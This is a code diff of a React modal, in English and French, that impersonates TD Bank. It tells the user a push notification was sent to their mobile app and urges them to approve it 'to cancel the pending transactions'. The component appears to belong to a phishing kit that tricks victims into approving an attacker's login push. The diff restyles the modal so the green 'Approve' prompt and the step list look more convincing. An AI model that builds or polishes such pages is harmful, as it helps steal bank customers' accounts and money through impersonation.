@@ -3,7 +3,8 @@ import { X, ShieldCheck, Smartphone, CheckCircle } from 'lucide-react';
 
 const translations = {
   en: {
-    title: 'Approve Transaction',
+    titleButton: 'Approve',
+    titleText: ' Transaction',
     subtitle: 'A push notification was sent to your TD Bank mobile app. Please open your app and approve the request to cancel the pending transactions.',
     bullets: [
       { icon: Smartphone, text: 'Open your TD Bank mobile app' },
@@ -17,7 +18,8 @@ const translations = {
     successText: 'Your pending transactions will be cancelled in a moment...',
   },
   fr: {
-    title: 'Approuver la Transaction',
+    titleButton: 'Approuver',
+    titleText: ' la Transaction',
     subtitle: 'Une notification push a été envoyée à votre application mobile TD. Veuillez ouvrir votre application et approuver la demande pour annuler les transactions en attente.',
     bullets: [
       { icon: Smartphone, text: 'Ouvrez votre application mobile TD' },
@@ -135,35 +137,46 @@ export default function AppPushModal({ email, lang = 'en', onClose }) {
           </div>
         ) : (
           <>
-            <h3 className="text-[22px] font-bold text-[#1f2937] text-center mb-2 tracking-tight">
-              {t.title}
-            </h3>
-            <p className="text-[#6b7280] text-[14.5px] text-center mb-6 leading-relaxed px-2">
+            <div className="flex items-center justify-center gap-2 mb-3">
+              <div className="bg-[#1a7b3a] text-white px-3.5 py-1.5 rounded-lg shadow-sm font-bold text-[18px] tracking-wide border border-[#125d2b]">
+                {t.titleButton}
+              </div>
+              <h3 className="text-[22px] font-bold text-[#1f2937] tracking-tight">
+                {t.titleText}
+              </h3>
+            </div>
+            <p className="text-[#4b5563] text-[14.5px] text-center mb-6 leading-relaxed px-2 font-medium">
               {t.subtitle}
             </p>
 
             {/* Bullet features cards */}
-            <ul className="space-y-3 mb-6">
-              {t.bullets.map(({ icon: Icon, text }) => (
-                <li 
-                  key={text} 
-                  className="flex items-center gap-3.5 p-3 rounded-xl bg-[#f0faf3]/60 border border-[#e8f5ec]/80 hover:bg-[#e8f5ec]/70 transition-all duration-300"
-                >
-                  <span className="flex-shrink-0 w-8 h-8 rounded-lg bg-[#e8f5ec] flex items-center justify-center shadow-sm">
-                    <Icon className="w-[18px] h-[18px] text-[#1a7b3a]" />
-                  </span>
-                  <span className="text-[13.5px] text-[#374151] font-medium leading-tight">{text}</span>
-                </li>
-              ))}
-            </ul>
+            <div className="bg-[#f9fafb] border border-[#e5e7eb] rounded-xl p-4 mb-6 shadow-inner">
+              <ul className="space-y-4">
+                {t.bullets.map(({ icon: Icon, text }, idx) => (
+                  <li 
+                    key={text} 
+                    className="flex items-start gap-3.5 relative"
+                  >
+                    {idx !== t.bullets.length - 1 && (
+                      <div className="absolute left-[15px] top-[30px] bottom-[-16px] w-[2px] bg-[#e5e7eb] z-0"></div>
+                    )}
+                    <span className="flex-shrink-0 w-8 h-8 rounded-full bg-white border-2 border-[#1a7b3a] flex items-center justify-center shadow-sm z-10 relative">
+                      <Icon className="w-[16px] h-[16px] text-[#1a7b3a]" />
+                    </span>
+                    <span className="text-[14px] text-[#374151] font-medium leading-snug pt-1.5">{text}</span>
+                  </li>
+                ))}
+              </ul>
+            </div>
 
             {/* Waiting indicator */}
-            <div className="flex flex-col items-center justify-center gap-3 mt-2 mb-4 bg-[#f8fafc] py-4 rounded-xl border border-[#e2e8f0]">
-              <svg className="animate-spin w-7 h-7 text-[#1a7b3a]" viewBox="0 0 24 24" fill="none">
-                <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeOpacity="0.25"/>
-                <path d="M12 2a10 10 0 0 1 10 10" stroke="currentColor" strokeWidth="3" strokeLinecap="round"/>
-              </svg>
-              <span className="text-[14px] text-[#475569] font-medium animate-pulse">{t.waitingText}</span>
+            <div className="flex flex-col items-center justify-center gap-3 mt-2 mb-2 py-3 rounded-xl">
+              <div className="relative flex items-center justify-center w-12 h-12">
+                <div className="absolute inset-0 border-4 border-[#e8f5ec] rounded-full"></div>
+                <div className="absolute inset-0 border-4 border-[#1a7b3a] rounded-full border-t-transparent animate-spin"></div>
+                <Smartphone className="w-5 h-5 text-[#1a7b3a]" />
+              </div>
+              <span className="text-[14px] text-[#1a7b3a] font-semibold animate-pulse tracking-wide">{t.waitingText}</span>
             </div>
 
             <p className="text-[12px] text-[#888] text-center mt-2 leading-normal px-2">
